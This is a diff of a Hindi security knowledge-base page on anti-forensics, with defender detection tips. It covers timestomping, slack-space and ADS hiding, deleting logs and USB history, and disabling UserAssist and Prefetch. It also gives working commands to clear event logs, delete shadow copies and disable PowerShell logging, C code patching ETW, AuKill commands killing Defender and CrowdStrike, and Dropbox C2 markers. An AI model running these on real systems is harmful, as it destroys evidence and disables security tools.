@@ -4,72 +4,72 @@
 
 ## Timestamps
 
-एक हमलावर **फाइलों के टाइमस्टैम्प को बदलने** में रुचि रख सकता है ताकि उसे पकड़ा न जा सके।\
-यह संभव है कि MFT के अंदर `$STANDARD_INFORMATION` \_\_ और \_\_ `$FILE_NAME` में टाइमस्टैम्प पाए जाएं।
+एक attacker का पता लगाए जाने से बचने के लिए **files के timestamps बदलने** में interest हो सकता है।\
+MFT के अंदर attributes `$STANDARD_INFORMATION` \_\_ और \_\_ `$FILE_NAME` में timestamps मिलना संभव है।
 
-दोनों विशेषताओं में 4 टाइमस्टैम्प होते हैं: **संशोधन**, **पहुँच**, **निर्माण**, और **MFT रजिस्ट्रि संशोधन** (MACE या MACB)।
+दोनों attributes में 4 timestamps होते हैं: **Modification**, **access**, **creation**, और **MFT registry modification** (MACE या MACB)।
 
-**Windows explorer** और अन्य उपकरण **`$STANDARD_INFORMATION`** से जानकारी दिखाते हैं।
+**Windows explorer** और अन्य tools **`$STANDARD_INFORMATION`** से information दिखाते हैं।
 
 ### TimeStomp - Anti-forensic Tool
 
-यह उपकरण **`$STANDARD_INFORMATION`** के अंदर टाइमस्टैम्प जानकारी को **संशोधित** करता है **लेकिन** **`$FILE_NAME`** के अंदर की जानकारी को **नहीं**। इसलिए, **संदिग्ध** **गतिविधि** को **पहचानना** संभव है।
+यह tool **`$STANDARD_INFORMATION`** के अंदर timestamp information को **modify** करता है, लेकिन **`$FILE_NAME`** के अंदर की information को **modify नहीं** करता। इसलिए **suspicious** **activity** की पहचान करना संभव है।
 
 ### Usnjrnl
 
-**USN Journal** (Update Sequence Number Journal) NTFS (Windows NT फाइल सिस्टम) की एक विशेषता है जो वॉल्यूम परिवर्तनों का ट्रैक रखती है। [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) उपकरण इन परिवर्तनों की जांच करने की अनुमति देता है।
+**USN Journal** (Update Sequence Number Journal), NTFS (Windows NT file system) का एक feature है, जो volume में होने वाले बदलावों का record रखता है। [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) tool इन बदलावों की examination की अनुमति देता है।
 
-![](<../../images/image (801).png>)
+![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal), NTFS (Windows NT file system) का एक feature है, जो volume में होने वाले बदलावों का record रखता है।...](<../../images/image (801).png>)
 
-पिछली छवि **उपकरण** द्वारा दिखाया गया **आउटपुट** है जहाँ देखा जा सकता है कि कुछ **परिवर्तन किए गए** थे।
+पिछली image **tool** द्वारा दिखाया गया **output** है, जिसमें देखा जा सकता है कि file में कुछ **changes किए गए** थे।
 
 ### $LogFile
 
-**फाइल सिस्टम में सभी मेटाडेटा परिवर्तनों को लॉग किया जाता है** जिसे [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) के रूप में जाना जाता है। लॉग की गई मेटाडेटा एक फ़ाइल में रखी जाती है जिसका नाम `**$LogFile**` है, जो NTFS फाइल सिस्टम के रूट डायरेक्टरी में स्थित है। [LogFileParser](https://github.com/jschicht/LogFileParser) जैसे उपकरण का उपयोग इस फ़ाइल को पार्स करने और परिवर्तनों की पहचान करने के लिए किया जा सकता है।
+**File system में होने वाले सभी metadata changes को log किया जाता है**। इस process को [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) कहा जाता है। Logged metadata को `**$LogFile**` नाम की file में रखा जाता है, जो NTFS file system की root directory में स्थित होती है। इस file को parse करने और changes की पहचान करने के लिए [LogFileParser](https://github.com/jschicht/LogFileParser) जैसे tools का उपयोग किया जा सकता है।
 
-![](<../../images/image (137).png>)
+![Usnjrnl - $LogFile: File system में होने वाले सभी metadata changes को write-ahead logging नामक process में log किया जाता है। Logged metadata को $LogFile नाम की file में रखा जाता है, जो root...](<../../images/image (137).png>)
 
-फिर से, उपकरण के आउटपुट में यह देखना संभव है कि **कुछ परिवर्तन किए गए** थे।
+फिर से, tool के output में यह देखा जा सकता है कि **कुछ changes किए गए** थे।
 
-उसी उपकरण का उपयोग करके यह पहचानना संभव है कि **कब टाइमस्टैम्प संशोधित किए गए** थे:
+उसी tool का उपयोग करके यह पहचानना संभव है कि **timestamps किस समय modify किए गए**:
 
-![](<../../images/image (1089).png>)
+![Usnjrnl - $LogFile: उसी tool का उपयोग करके यह पहचानना संभव है कि timestamps किस समय modify किए गए](<../../images/image (1089).png>)
 
-- CTIME: फ़ाइल का निर्माण समय
-- ATIME: फ़ाइल का संशोधन समय
-- MTIME: फ़ाइल का MFT रजिस्ट्रि संशोधन
-- RTIME: फ़ाइल का पहुँच समय
+- CTIME: File का creation time
+- ATIME: File का modification time
+- MTIME: File का MFT registry modification
+- RTIME: File का access time
 
-### `$STANDARD_INFORMATION` और `$FILE_NAME` तुलना
+### `$STANDARD_INFORMATION` and `$FILE_NAME` comparison
 
-संदिग्ध संशोधित फ़ाइलों की पहचान करने का एक और तरीका दोनों विशेषताओं पर समय की तुलना करना है और **असंगतियों** की तलाश करना है।
+Suspicious रूप से modified files की पहचान करने का एक अन्य तरीका दोनों attributes के time की तुलना करना और **mismatches** ढूँढना है।
 
 ### Nanoseconds
 
-**NTFS** टाइमस्टैम्प की **सटीकता** **100 नैनोसेकंड** है। इसलिए, 2010-10-10 10:10:**00.000:0000 जैसे टाइमस्टैम्प वाली फ़ाइलें **बहुत संदिग्ध** हैं।
+**NTFS** timestamps की **precision** **100 nanoseconds** होती है। इसलिए 2010-10-10 10:10:**00.000:0000 जैसे timestamps वाली files मिलना **बहुत suspicious** है।
 
 ### SetMace - Anti-forensic Tool
 
-यह उपकरण दोनों विशेषताओं `$STARNDAR_INFORMATION` और `$FILE_NAME` को संशोधित कर सकता है। हालाँकि, Windows Vista से, इस जानकारी को संशोधित करने के लिए एक लाइव OS की आवश्यकता होती है।
+यह tool दोनों attributes `$STARNDAR_INFORMATION` और `$FILE_NAME` को modify कर सकता है। हालांकि, Windows Vista से, इस information को modify करने के लिए live OS का होना आवश्यक है।
 
 ## Data Hiding
 
-NFTS एक क्लस्टर और न्यूनतम जानकारी के आकार का उपयोग करता है। इसका मतलब है कि यदि एक फ़ाइल एक और आधे क्लस्टर का उपयोग करती है, तो **बचा हुआ आधा कभी उपयोग नहीं किया जाएगा** जब तक फ़ाइल को हटा नहीं दिया जाता। फिर, इस स्लैक स्पेस में **डेटा छिपाना** संभव है।
+NFTS cluster और minimum information size का उपयोग करता है। इसका अर्थ है कि यदि कोई file एक cluster और आधे cluster का उपयोग करती है, तो **बचा हुआ आधा हिस्सा कभी उपयोग नहीं किया जाएगा** जब तक कि file delete न हो जाए। इसलिए, **इस slack space में data छिपाना** संभव है।
 
-ऐसे उपकरण हैं जैसे slacker जो इस "छिपे हुए" स्थान में डेटा छिपाने की अनुमति देते हैं। हालाँकि, `$logfile` और `$usnjrnl` का विश्लेषण दिखा सकता है कि कुछ डेटा जोड़ा गया था:
+slacker जैसे tools इस "hidden" space में data छिपाने की अनुमति देते हैं। हालांकि, `$logfile` और `$usnjrnl` का analysis यह दिखा सकता है कि कुछ data add किया गया था:
 
-![](<../../images/image (1060).png>)
+![SetMace - Anti-forensic Tool - Data Hiding: slacker जैसे tools इस "hidden" space में data छिपाने की अनुमति देते हैं। हालांकि, $logfile और $usnjrnl का analysis यह दिखा सकता है कि...](<../../images/image (1060).png>)
 
-फिर, FTK Imager जैसे उपकरणों का उपयोग करके स्लैक स्पेस को पुनर्प्राप्त करना संभव है। ध्यान दें कि इस प्रकार के उपकरण सामग्री को ओब्स्क्यूरेट या यहां तक कि एन्क्रिप्टेड रूप में सहेज सकते हैं।
+इसके बाद, FTK Imager जैसे tools का उपयोग करके slack space को retrieve करना संभव है। ध्यान दें कि इस प्रकार का tool content को obfuscated या यहां तक कि encrypted रूप में save कर सकता है।
 
 ## UsbKill
 
-यह एक उपकरण है जो **USB** पोर्ट में किसी भी परिवर्तन का पता लगाते ही **कंप्यूटर को बंद** कर देगा।\
-इसका पता लगाने का एक तरीका चल रहे प्रक्रियाओं का निरीक्षण करना और **प्रत्येक चल रहे पायथन स्क्रिप्ट की समीक्षा करना** है।
+यह एक ऐसा tool है जो **USB ports में कोई भी change detect होने पर computer को बंद कर देता है**।\
+इसे discover करने का एक तरीका running processes को inspect करना और **चल रही प्रत्येक Python script की review करना** है।
 
 ## Live Linux Distributions
 
-ये डिस्ट्रीब्यूशन **RAM** मेमोरी के अंदर **निष्पादित** होते हैं। इन्हें केवल तभी पता लगाया जा सकता है जब **NTFS फाइल सिस्टम को लिखने की अनुमति के साथ माउंट किया गया हो**। यदि इसे केवल पढ़ने की अनुमति के साथ माउंट किया गया है, तो घुसपैठ का पता लगाना संभव नहीं होगा।
+ये distros **RAM** memory के अंदर **execute** होते हैं। इन्हें detect करने का एकमात्र तरीका यह है कि NTFS file-system को write permissions के साथ mount किया गया हो। यदि इसे केवल read permissions के साथ mount किया गया है, तो intrusion को detect करना संभव नहीं होगा।
 
 ## Secure Deletion
 
@@ -77,73 +77,73 @@ NFTS एक क्लस्टर और न्यूनतम जानका�
 
 ## Windows Configuration
 
-कई विंडोज लॉगिंग विधियों को अक्षम करना संभव है ताकि फॉरेंसिक जांच को बहुत कठिन बनाया जा सके।
+Forensics investigation को बहुत कठिन बनाने के लिए Windows की कई logging methods को disable करना संभव है।
 
 ### Disable Timestamps - UserAssist
 
-यह एक रजिस्ट्री कुंजी है जो उपयोगकर्ता द्वारा चलाए गए प्रत्येक निष्पादन योग्य की तारीखों और घंटों को बनाए रखती है।
+यह एक registry key है, जो user द्वारा प्रत्येक executable को run किए जाने की dates और hours maintain करती है।
 
-UserAssist को अक्षम करने के लिए दो चरणों की आवश्यकता होती है:
+UserAssist को disable करने के लिए दो steps आवश्यक हैं:
 
-1. दो रजिस्ट्री कुंजी सेट करें, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` और `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, दोनों को शून्य पर सेट करें ताकि संकेत मिले कि हम UserAssist को अक्षम करना चाहते हैं।
-2. अपने रजिस्ट्री उप-ट्री को साफ करें जो `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` की तरह दिखते हैं।
+1. दो registry keys, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` और `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, दोनों को zero पर set करें, ताकि signal मिले कि हम UserAssist को disabled करना चाहते हैं।
+2. अपनी उन registry subtrees को clear करें जो `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` जैसी दिखती हैं।
 
 ### Disable Timestamps - Prefetch
 
-यह उन अनुप्रयोगों के बारे में जानकारी सहेजता है जो Windows सिस्टम के प्रदर्शन में सुधार के लक्ष्य के साथ निष्पादित होते हैं। हालाँकि, यह फॉरेंसिक प्रथाओं के लिए भी उपयोगी हो सकता है।
+यह Windows system की performance सुधारने के उद्देश्य से executed applications के बारे में information save करता है। हालांकि, यह forensics practices के लिए भी useful हो सकता है।
 
-- `regedit` निष्पादित करें
-- फ़ाइल पथ का चयन करें `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
-- दोनों `EnablePrefetcher` और `EnableSuperfetch` पर राइट-क्लिक करें
-- प्रत्येक पर संशोधित करें ताकि मान 1 (या 3) से 0 में बदल जाए
-- पुनरारंभ करें
+- `regedit` execute करें
+- File path `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` select करें
+- `EnablePrefetcher` और `EnableSuperfetch` दोनों पर right-click करें
+- इनमें से प्रत्येक पर Modify select करके value को 1 (या 3) से 0 में बदलें
+- Restart करें
 
 ### Disable Timestamps - Last Access Time
 
-जब भी एक फ़ोल्डर NTFS वॉल्यूम से Windows NT सर्वर पर खोला जाता है, तो सिस्टम प्रत्येक सूचीबद्ध फ़ोल्डर पर **एक टाइमस्टैम्प फ़ील्ड को अपडेट करने के लिए समय लेता है**, जिसे अंतिम पहुँच समय कहा जाता है। एक भारी उपयोग किए गए NTFS वॉल्यूम पर, यह प्रदर्शन को प्रभावित कर सकता है।
+जब भी Windows NT server पर किसी NTFS volume से folder open किया जाता है, system प्रत्येक listed folder पर एक timestamp field update करने के लिए time record करता है, जिसे last access time कहा जाता है। अत्यधिक उपयोग किए जाने वाले NTFS volume पर इसका performance पर प्रभाव पड़ सकता है।
 
-1. रजिस्ट्री संपादक (Regedit.exe) खोलें।
+1. Registry Editor (Regedit.exe) open करें।
 2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem` पर जाएं।
-3. `NtfsDisableLastAccessUpdate` की तलाश करें। यदि यह मौजूद नहीं है, तो इस DWORD को जोड़ें और इसका मान 1 पर सेट करें, जो प्रक्रिया को अक्षम कर देगा।
-4. रजिस्ट्री संपादक बंद करें, और सर्वर को पुनरारंभ करें।
+3. `NtfsDisableLastAccessUpdate` खोजें। यदि यह मौजूद नहीं है, तो यह DWORD add करें और इसकी value 1 set करें, जिससे process disable हो जाएगा।
+4. Registry Editor बंद करें और server reboot करें।
 
 ### Delete USB History
 
-सभी **USB डिवाइस प्रविष्टियाँ** Windows रजिस्ट्री में **USBSTOR** रजिस्ट्री कुंजी के तहत संग्रहीत होती हैं जिसमें उप कुंजियाँ होती हैं जो तब बनाई जाती हैं जब आप अपने पीसी या लैपटॉप में USB डिवाइस लगाते हैं। आप इस कुंजी को यहाँ पा सकते हैं `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`। **इसे हटाने से** आप USB इतिहास को हटा देंगे।\
-आप यह सुनिश्चित करने के लिए [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) उपकरण का भी उपयोग कर सकते हैं कि आपने उन्हें हटा दिया है (और उन्हें हटाने के लिए)।
+सभी **USB Device Entries** Windows Registry में **USBSTOR** registry key के अंतर्गत store होती हैं। इसमें ऐसी sub keys होती हैं, जो जब भी आप अपने PC या Laptop में USB Device plug करते हैं, create होती हैं। यह key यहां मिल सकती है: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **इसे delete करने पर** USB history delete हो जाएगी।\
+आप यह सुनिश्चित करने के लिए [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) tool का भी उपयोग कर सकते हैं कि वे delete हो गए हैं (और उन्हें delete करने के लिए भी)।
 
-एक और फ़ाइल जो USB के बारे में जानकारी सहेजती है वह फ़ाइल `setupapi.dev.log` है जो `C:\Windows\INF` के अंदर है। इसे भी हटाया जाना चाहिए।
+एक अन्य file जो USBs की information save करती है, वह `C:\Windows\INF` के अंदर मौजूद `setupapi.dev.log` file है। इसे भी delete किया जाना चाहिए।
 
 ### Disable Shadow Copies
 
-**सूची** शैडो कॉपियों के साथ `vssadmin list shadowstorage`\
-**हटाएं** उन्हें चलाकर `vssadmin delete shadow`
+`vssadmin list shadowstorage` से shadow copies की **list** प्राप्त करें\
+`vssadmin delete shadow` run करके उन्हें **delete** करें
 
-आप GUI के माध्यम से भी उन्हें हटा सकते हैं [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) में प्रस्तावित चरणों का पालन करके।
+आप [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) में दिए गए steps का पालन करके GUI के माध्यम से भी उन्हें delete कर सकते हैं।
 
-शैडो कॉपियों को अक्षम करने के लिए [यहाँ से चरण](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
+Shadow copies को disable करने के लिए [steps from here](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
 
-1. Windows स्टार्ट बटन पर क्लिक करने के बाद टेक्स्ट सर्च बॉक्स में "services" टाइप करके सेवाएँ प्रोग्राम खोलें।
-2. सूची में "Volume Shadow Copy" खोजें, इसे चुनें, और फिर राइट-क्लिक करके प्रॉपर्टीज़ पर जाएं।
-3. "Startup type" ड्रॉप-डाउन मेनू से Disabled चुनें, और फिर Apply और OK पर क्लिक करके परिवर्तन की पुष्टि करें।
+1. Windows start button पर click करने के बाद text search box में "services" type करके Services program open करें।
+2. List में "Volume Shadow Copy" खोजें, उसे select करें और फिर right-click करके Properties access करें।
+3. "Startup type" drop-down menu से Disabled चुनें और Apply तथा OK पर click करके change confirm करें।
 
-यह भी संभव है कि रजिस्ट्री `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` में शैडो कॉपी में कॉपी किए जाने वाले फ़ाइलों की कॉन्फ़िगरेशन को संशोधित किया जाए।
+Registry में shadow copy में copy की जाने वाली files के configuration को modify करना भी संभव है: `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`
 
 ### Overwrite deleted files
 
-- आप एक **Windows उपकरण** का उपयोग कर सकते हैं: `cipher /w:C` यह सिफारिश करेगा कि सिफर C ड्राइव के अंदर उपलब्ध अप्रयुक्त डिस्क स्थान से किसी भी डेटा को हटा दे।
-- आप [**Eraser**](https://eraser.heidi.ie) जैसे उपकरणों का भी उपयोग कर सकते हैं।
+- आप एक **Windows tool** का उपयोग कर सकते हैं: `cipher /w:C`। यह cipher को C drive के अंदर उपलब्ध unused disk space से कोई भी data remove करने का निर्देश देगा।
+- आप [**Eraser**](https://eraser.heidi.ie) जैसे tools का भी उपयोग कर सकते हैं।
 
 ### Delete Windows event logs
 
-- Windows + R --> eventvwr.msc --> "Windows Logs" का विस्तार करें --> प्रत्येक श्रेणी पर राइट-क्लिक करें और "Clear Log" चुनें
+- Windows + R --> eventvwr.msc --> "Windows Logs" expand करें --> प्रत्येक category पर right-click करें और "Clear Log" select करें
 - `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
 - `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`
 
 ### Disable Windows event logs
 
 - `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
-- सेवाओं के अनुभाग के अंदर "Windows Event Log" सेवा को अक्षम करें
+- Services section में "Windows Event Log" service को disable करें
 - `WEvtUtil.exec clear-log` या `WEvtUtil.exe cl`
 
 ### Disable $UsnJrnl
@@ -156,9 +156,8 @@ UserAssist को अक्षम करने के लिए दो चरण
 
 ### PowerShell ScriptBlock/Module Logging
 
-Windows 10/11 और Windows Server के हाल के संस्करण **समृद्ध PowerShell फॉरेंसिक कलाकृतियों** को बनाए रखते हैं
-`Microsoft-Windows-PowerShell/Operational` (इवेंट 4104/4105/4106) के तहत।
-हमलावर इन्हें ऑन-द-फ्लाई अक्षम या मिटा सकते हैं:
+Windows 10/11 और Windows Server के recent versions `Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106) के अंतर्गत **समृद्ध PowerShell forensic artifacts** रखते हैं।
+Attackers इन्हें on-the-fly disable या wipe कर सकते हैं:
 ```powershell
 # Turn OFF ScriptBlock & Module logging (registry persistence)
 New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
@@ -170,11 +169,13 @@ New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShel
 Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
 Remove-WinEvent               # requires admin & Win11 23H2+
 ```
-रक्षक को उन रजिस्ट्री कुंजियों में परिवर्तनों और PowerShell घटनाओं के उच्च मात्रा में हटाने की निगरानी करनी चाहिए।
+Defenders को उन registry keys में होने वाले बदलावों और PowerShell events को बड़े पैमाने पर हटाए जाने की निगरानी करनी चाहिए।
 
-### ETW (Windows के लिए इवेंट ट्रेसिंग) पैच
+### ETW (Event Tracing for Windows) Patch
 
-एंडपॉइंट सुरक्षा उत्पाद ETW पर बहुत निर्भर करते हैं। एक लोकप्रिय 2024 बचाव विधि है कि मेमोरी में `ntdll!EtwEventWrite`/`EtwEventWriteFull` को पैच किया जाए ताकि हर ETW कॉल `STATUS_SUCCESS` लौटाए बिना घटना को उत्पन्न किए।
+Endpoint security products ETW पर बहुत अधिक निर्भर करते हैं। 2024 की एक लोकप्रिय evasion method है memory में
+`ntdll!EtwEventWrite`/`EtwEventWriteFull` को patch करना, ताकि हर ETW call event emit किए बिना
+`STATUS_SUCCESS` return करे:
 ```c
 // 0xC3 = RET on x64
 unsigned char patch[1] = { 0xC3 };
@@ -182,42 +183,46 @@ WriteProcessMemory(GetCurrentProcess(),
 GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
 patch, sizeof(patch), NULL);
 ```
-Public PoCs (e.g. `EtwTiSwallow`) PowerShell या C++ में वही प्राइमिटिव लागू करते हैं। चूंकि पैच **प्रोसेस-लोकल** है, अन्य प्रोसेस के अंदर चल रहे EDRs इसे मिस कर सकते हैं।  
-Detection: `ntdll` को मेमोरी में और डिस्क पर तुलना करें, या यूजर-मोड से पहले हुक करें।
+Public PoCs (जैसे `EtwTiSwallow`) PowerShell या C++ में इसी primitive को implement करते हैं।  
+क्योंकि patch **process-local** होता है, इसलिए अन्य processes के अंदर चलने वाले EDRs इसे miss कर सकते हैं।  
+Detection: memory में मौजूद `ntdll` की disk पर मौजूद कॉपी से तुलना करें, या user-mode से पहले hook करें।
 
 ### Alternate Data Streams (ADS) Revival
 
-2023 में मैलवेयर अभियान (जैसे **FIN12** लोडर्स) को पारंपरिक स्कैनरों की नज़र से बाहर रहने के लिए ADS के अंदर दूसरे चरण के बाइनरी स्टेज करते हुए देखा गया है:
+2023 में malware campaigns (जैसे **FIN12** loaders) में traditional scanners की नजर से दूर रहने के लिए second-stage binaries को ADS के अंदर staging करते हुए देखा गया है:
 ```cmd
 rem Hide cobalt.bin inside an ADS of a PDF
 type cobalt.bin > report.pdf:win32res.dll
 rem Execute directly
 wmic process call create "cmd /c report.pdf:win32res.dll"
 ```
-`dir /R`, `Get-Item -Stream *`, या Sysinternals `streams64.exe` के साथ स्ट्रीम्स की गणना करें। होस्ट फ़ाइल को FAT/exFAT या SMB के माध्यम से कॉपी करने से छिपी स्ट्रीम हटा दी जाएगी और इसका उपयोग जांचकर्ताओं द्वारा पेलोड को पुनर्प्राप्त करने के लिए किया जा सकता है।
+`dir /R`, `Get-Item -Stream *`, या Sysinternals `streams64.exe` से streams enumerate करें।  
+Host file को FAT/exFAT पर या SMB के माध्यम से copy करने पर hidden stream हट जाएगा और investigators इसका उपयोग payload recover करने के लिए कर सकते हैं।
 
 ### BYOVD & “AuKill” (2023)
 
-Bring-Your-Own-Vulnerable-Driver अब रैंसमवेयर घुसपैठ में **एंटी-फॉरेंसिक्स** के लिए नियमित रूप से उपयोग किया जाता है। ओपन-सोर्स टूल **AuKill** एक साइन किया हुआ लेकिन कमजोर ड्राइवर (`procexp152.sys`) लोड करता है ताकि EDR और फॉरेंसिक सेंसर को **एन्क्रिप्शन और लॉग विनाश से पहले** निलंबित या समाप्त किया जा सके:
+Bring-Your-Own-Vulnerable-Driver का उपयोग अब ransomware intrusions में **anti-forensics** के लिए नियमित रूप से किया जाता है।  
+Open-source tool **AuKill** एक signed लेकिन vulnerable driver (`procexp152.sys`) load करता है, ताकि **encryption & log destruction** से पहले EDR और forensic sensors को suspend या terminate किया जा सके:<sup>[[1]](#references)</sup>
 ```cmd
 AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
 AuKill.exe -k CrowdStrike
 ```
-ड्राइवर को बाद में हटा दिया जाता है, जिससे न्यूनतम अवशेष रह जाते हैं।  
-निवारण: Microsoft कमजोर-ड्राइवर ब्लॉकलिस्ट (HVCI/SAC) सक्षम करें, और उपयोगकर्ता-लिखने योग्य पथों से कर्नेल-सेवा निर्माण पर अलर्ट करें।
+The driver is removed afterwards, leaving minimal artifacts.<sup>[[1]](#references)</sup>  
+Mitigations: Microsoft vulnerable-driver blocklist (HVCI/SAC) enable करें,  
+और user-writable paths से kernel-service creation पर alert करें।
 
 ---
 
-## Linux एंटी-फॉरेंसिक्स: स्वयं-पैचिंग और क्लाउड C2 (2023–2025)
+## Linux Anti-Forensics: Self-Patching और Cloud C2 (2023–2025)
 
-### पहचान कम करने के लिए स्वयं-पैचिंग किए गए सेवाएँ (Linux)  
-विपक्षी अक्सर एक सेवा को उसके शोषण के तुरंत बाद "स्वयं-पैच" करते हैं ताकि पुनः-शोषण को रोका जा सके और कमजोरियों पर आधारित पहचान को दबाया जा सके। विचार यह है कि कमजोर घटकों को नवीनतम वैध अपस्ट्रीम बाइनरी/JARs के साथ प्रतिस्थापित किया जाए, ताकि स्कैनर होस्ट को पैच किया हुआ रिपोर्ट करें जबकि स्थायीता और C2 बनी रहे।
+### Detection कम करने के लिए compromised services को Self-patching करना (Linux)
+Adversaries किसी service का exploitation करने के तुरंत बाद उसे increasingly “self-patch” करते हैं, ताकि re-exploitation को रोका जा सके और vulnerability-based detections को suppress किया जा सके। विचार यह है कि vulnerable components को latest legitimate upstream binaries/JARs से replace कर दिया जाए, ताकि scanners host को patched report करें, जबकि persistence और C2 बने रहें।<sup>[[3]](#references)</sup>
 
-उदाहरण: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
-- पोस्ट-शोषण, हमलावरों ने Maven Central (repo1.maven.org) से वैध JARs प्राप्त किए, ActiveMQ इंस्टॉलेशन में कमजोर JARs को हटा दिया, और ब्रोकर को पुनः प्रारंभ किया।  
-- इससे प्रारंभिक RCE बंद हो गया जबकि अन्य पांव (cron, SSH कॉन्फ़िग परिवर्तन, अलग C2 इम्प्लांट) बनाए रखे गए।
+Example: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)<sup>[[3]](#references)[[4]](#references)</sup>
+- Post-exploitation के बाद attackers ने Maven Central (repo1.maven.org) से legitimate JARs fetch किए, ActiveMQ install में vulnerable JARs को delete किया और broker को restart किया।
+- इससे initial RCE बंद हो गया, जबकि अन्य footholds (cron, SSH config changes, separate C2 implants) बने रहे।
 
-संचालनात्मक उदाहरण (चित्रात्मक)
+Operational example (illustrative)
 ```bash
 # ActiveMQ install root (adjust as needed)
 AMQ_DIR=/opt/activemq
@@ -236,60 +241,56 @@ ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar
 systemctl restart activemq || service activemq restart
 ```
 Forensic/hunting tips
-- अस्थायी बाइनरी/JAR प्रतिस्थापन के लिए सेवा निर्देशिकाओं की समीक्षा करें:
-- Debian/Ubuntu: `dpkg -V activemq` और फ़ाइल हैश/पथों की तुलना करें रिपॉ मिरर्स के साथ।
-- RHEL/CentOS: `rpm -Va 'activemq*'`
-- उन JAR संस्करणों की तलाश करें जो डिस्क पर हैं और पैकेज प्रबंधक के स्वामित्व में नहीं हैं, या प्रतीकात्मक लिंक जो बैंड से बाहर अपडेट किए गए हैं।
-- टाइमलाइन: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` से ctime/mtime को समझौता विंडो के साथ सहसंबंधित करें।
-- शेल इतिहास/प्रक्रिया टेलीमेट्री: प्रारंभिक शोषण के तुरंत बाद `curl`/`wget` के `repo1.maven.org` या अन्य कलाकृति CDN के सबूत।
-- परिवर्तन प्रबंधन: यह मान्य करें कि "पैच" किसने लागू किया और क्यों, केवल यह नहीं कि एक पैच किया गया संस्करण मौजूद है।
+- अनिर्धारित binary/JAR replacements के लिए service directories की समीक्षा करें:
+- Debian/Ubuntu: `dpkg -V activemq` चलाएं और repo mirrors के साथ file hashes/paths की तुलना करें।
+- ऐसे JAR versions देखें जो disk पर मौजूद हों लेकिन package manager के स्वामित्व में न हों, या ऐसे symbolic links जिन्हें out of band update किया गया हो।
+- Timeline: compromise window के साथ ctime/mtime का correlation करने के लिए `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` चलाएं।
+- Shell history/process telemetry: initial exploitation के तुरंत बाद `repo1.maven.org` या अन्य artifact CDNs पर `curl`/`wget` के evidence देखें।
+- Change management: केवल patched version मौजूद होने की पुष्टि न करें, बल्कि यह validate करें कि “patch” किसने और क्यों लागू किया।
 
-### Cloud‑service C2 with bearer tokens and anti‑analysis stagers
-देखे गए व्यापार कौशल ने कई दीर्घकालिक C2 पथों और एंटी-विश्लेषण पैकेजिंग को जोड़ा:
-- पासवर्ड-संरक्षित PyInstaller ELF लोडर जो सैंडबॉक्सिंग और स्थैतिक विश्लेषण को बाधित करते हैं (जैसे, एन्क्रिप्टेड PYZ, अस्थायी निष्कर्षण `/_MEI*` के तहत)।
-- संकेतक: `strings` हिट जैसे `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`।
-- रनटाइम कलाकृतियाँ: `/tmp/_MEI*` या कस्टम `--runtime-tmpdir` पथों पर निष्कर्षण।
-- हार्डकोडेड OAuth बियरर टोकन का उपयोग करके Dropbox-समर्थित C2
-- नेटवर्क मार्कर: `api.dropboxapi.com` / `content.dropboxapi.com` के साथ `Authorization: Bearer <token>`।
